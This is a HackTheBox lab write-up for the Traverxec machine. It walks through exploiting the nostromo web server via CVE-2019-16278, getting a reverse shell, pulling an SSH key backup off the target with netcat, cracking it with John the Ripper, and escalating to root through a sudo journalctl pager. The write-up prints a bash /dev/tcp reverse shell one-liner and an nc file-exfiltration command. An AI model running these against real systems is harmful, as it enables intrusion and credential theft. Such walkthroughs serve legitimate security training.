![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/6bd1fabe-e487-4657-90a4-a896dae1d1e7)

https://app.hackthebox.com/machines/Traverxec

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Enumeration:

I began the enumeration using a quick rust scan to check for open ports and services:

```bash
sudo rustscan -a 10.10.10.165 -- -sC -sV -vv -oN traver_nmap
```

```Rust
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack ttl 63 nostromo 1.9.6
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan results showed two open ports, 22 for SSH and 80 for HTTP. The SSH service is running OpenSSH 7.9p1 on Debian 10, while the HTTP service is running nostromo version 1.9.6.

I then checked the searchsploit database for any available exploits related to nostromo & searchsploit results showed three exploits available for nostromo.:

```bash
searchsploit nostrormo
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f5d6e281-0d88-4215-9b8d-82209ced2dc6)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Initial access:

After checking the results of searchsploit, I noticed that only 2 exploits are related to the relevant version, and out of these 2, only 1 is a Python exploit. The other one is a Metasploit exploit, which I prefer not to use. To proceed without Metasploit, I downloaded the Python exploit and made some modifications to the script as it was showing errors while running.

After making the necessary changes, I executed the script to exploit the CVE-2019-16278 vulnerability on the target machine:

```python
python cve-2019-16278.py 10.10.10.165 80 'cat /etc/passwd'
```
The script successfully executed, and I obtained the output shown in the screenshot:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/a24e9815-044f-402b-b87b-7e3d7e90c107)

While exploring the contents of the **/etc/passwd** file, I discovered a user named "david." To gain a reverse shell on the target machine, I used a convenient bash one-liner and executed it through the python script. Within moments, I received a reverse shell in my netcat listener, confirming successful access to the system. 🙂

```python
python cve-2019-16278.py 10.10.10.165 80 'bash -c "bash -i >& /dev/tcp/10.10.14.128/53 0>&1"'
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/3b02ff8a-35ab-4d78-b109-108963928749)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## User access:

After gaining initial access as the "www-data" user, my next objective was to escalate privileges and gain access to user "david." I began by manually searching the system and discovered hashed credentials for "david" in the "/var/nostromo/conf" directory.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e1ff9641-baee-4355-91e9-7b302ca5dfb2)

I successfully cracked the hash and obtained the cleartext password:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9393b618-85b9-4d42-ab73-9fe7db127132)

My attempts to switch to "david" from the "www-data" user and to log in via SSH using the cracked password were unsuccessful.😕

However, while exploring the nhttpd [documentation](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd), I came across valuable information:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/72ae33a3-9e70-4aad-8ce7-9b29691d7f78)

Following this logic, I checked for the "~david" path and found that "david" has his home directory hosted on the web::

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/59e62377-8aa1-4308-b5a0-9a6a76c09af9)

Subsequently, I explored the "nhttpd.conf" file and discovered the "homedirs_public" folder at "public_www":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/e0f70c5c-d579-4147-b234-05aa203a6b15)

So, I moved into the David home directory & tried to list out the files but the current user doesn't have access for the David files, however I was able to cd into "public_www" folder located inside "David" home directory:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/0da7de0d-8a8a-4389-b96f-43bd99076013)

Within "David's" home directory, I encountered a folder named "protected-file-area" that contained a backup file named "backup-ssh-identity-files.tgz":

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4c5e4650-68d0-4b12-b99c-dfe7ddafa84b)

I transferred this backup file to my Kali host using netcat:

```bash
#from the victim machine
nc <kali IP> <Port> < backup-ssh-identity-files.tgz
```
```bash
#from my attacking machine
nc -lnvp <port> > output-file.tgz
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/c1d9a98f-87d4-464a-82f9-161c2f05a53d)

Once the transfer was complete, I extracted the contents of the "backup-ssh.tgz" file using the following command:

```bash
tar xzvf backup-ssh.tgz
```
![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/5d34a73a-506f-4158-aba7-65484c993de6)

Among the extracted files, I found the "id_rsa" SSH private key. 

I changed the SSH private key file permission using "chmod 600" & tried to login with this key. However, the key was encrypted and required a password for use.

To proceed, I used John The Ripper to crack the SSH private key password:

```bash
ssh2john id_rsa > john_rsa

john john_rsa -w=/usr/share/wordlist/rockyou.txt
```

Using this method, I quickly obtained the clear-text credentials:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/4ba889f3-e112-447d-9a71-0b8164880ee8)

With the cracked credentials, I successfully logged in as "david" and retrieved the user flag. Mission accomplished! (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/280cfb58-a11b-4191-aeca-6c1f3d056cad)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------

## Privilege Escalation:

After gaining access to user "david," I explored the contents of David's home directory and found an interesting file named "server-stats.sh" in the "/bin" folder:

File contains below code:

```bash
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```
The script runs the "journalctl" command with sudo privileges in the last line of the script, which piqued my interest. After reviewing the GtfoBins page for "journalctl," I discovered that it invokes the default pager, often "less," which provides an opportunity for privilege escalation.

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/82e18d27-9f92-4b39-9061-eebf8a005267)

While running the last line of code manually, it isn't loading the less pager.

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

Upon executing the last line of the script manually, the less pager didn't load as expected. However, I found a clever solution: by minimizing the terminal window's size, the journalctl command would be unable to display the required 5 lines, triggering the loading of the less pager.

Executing the following command with a minimized terminal loaded the less pager:

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/9bad58f8-959c-4da0-92c5-ec0930d0af18)

Once the less pager was loaded, I used the command "!/bin/bash" to execute a bash shell, effectively gaining root access. (pwn3d!🙂)

![image](https://github.com/F41zK4r1m/HackTheBox/assets/87700008/f553be3b-5da0-439f-9bf8-9595058a95ad)

